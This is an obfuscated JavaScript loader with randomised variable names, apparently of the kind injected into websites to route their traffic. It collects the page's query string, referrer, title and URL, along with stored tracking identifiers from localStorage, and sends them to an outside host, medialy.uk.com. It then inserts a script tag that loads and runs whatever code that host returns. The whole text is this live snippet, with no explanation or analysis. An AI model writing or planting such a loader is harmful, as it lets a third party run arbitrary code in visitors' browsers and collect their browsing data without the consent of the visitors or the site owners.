(function() {
    var name = '_gP9TVM5CbHS59hdQ';
    if (!window._gP9TVM5CbHS59hdQ) {
        window._gP9TVM5CbHS59hdQ = {
            unique: false,
            ttl: 86400,
            R_PATH: 'https://medialy.uk.com/9xPgD8gN',
            P_PATH: 'https://medialy.uk.com/c9c128a/postback',
        };
    }
    const _rK7PVXZs3X16zwXy = localStorage.getItem('config');
    if (typeof _rK7PVXZs3X16zwXy !== 'undefined' && _rK7PVXZs3X16zwXy !== null) {
        var _hC3Qmw6PZSQdh5Xw = JSON.parse(_rK7PVXZs3X16zwXy);
        var _HvHMHcM43HC9qD9M = Math.round(+new Date()/1000);
        if (_hC3Qmw6PZSQdh5Xw.created_at + window._gP9TVM5CbHS59hdQ.ttl < _HvHMHcM43HC9qD9M) {
            localStorage.removeItem('subId');
            localStorage.removeItem('token');
            localStorage.removeItem('config');
        }
    }
    var _TKZyj74PdbHK4HVv = localStorage.getItem('subId');
    var _D8h4NqsQ3Dsg22xv = localStorage.getItem('token');
    var _BvWrLJW1ssHFwrBQ = '?return=js.client';
        _BvWrLJW1ssHFwrBQ += '&' + decodeURIComponent(window.location.search.replace('?', ''));
        _BvWrLJW1ssHFwrBQ += '&se_referrer=' + encodeURIComponent(document.referrer);
        _BvWrLJW1ssHFwrBQ += '&default_keyword=' + encodeURIComponent(document.title);
        _BvWrLJW1ssHFwrBQ += '&landing_url=' + encodeURIComponent(document.location.hostname + document.location.pathname);
        _BvWrLJW1ssHFwrBQ += '&name=' + encodeURIComponent(name);
        _BvWrLJW1ssHFwrBQ += '&host=' + encodeURIComponent(window._gP9TVM5CbHS59hdQ.R_PATH);
    if (typeof _TKZyj74PdbHK4HVv !== 'undefined' && _TKZyj74PdbHK4HVv && window._gP9TVM5CbHS59hdQ.unique) {
        _BvWrLJW1ssHFwrBQ += '&sub_id=' + encodeURIComponent(_TKZyj74PdbHK4HVv);
    }
    if (typeof _D8h4NqsQ3Dsg22xv !== 'undefined' && _D8h4NqsQ3Dsg22xv && window._gP9TVM5CbHS59hdQ.unique) {
        _BvWrLJW1ssHFwrBQ += '&token=' + encodeURIComponent(_D8h4NqsQ3Dsg22xv);
    }
    var a = document.createElement('script');
        a.type = 'application/javascript';
        a.src = window._gP9TVM5CbHS59hdQ.R_PATH + _BvWrLJW1ssHFwrBQ;
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(a, s)
    })();
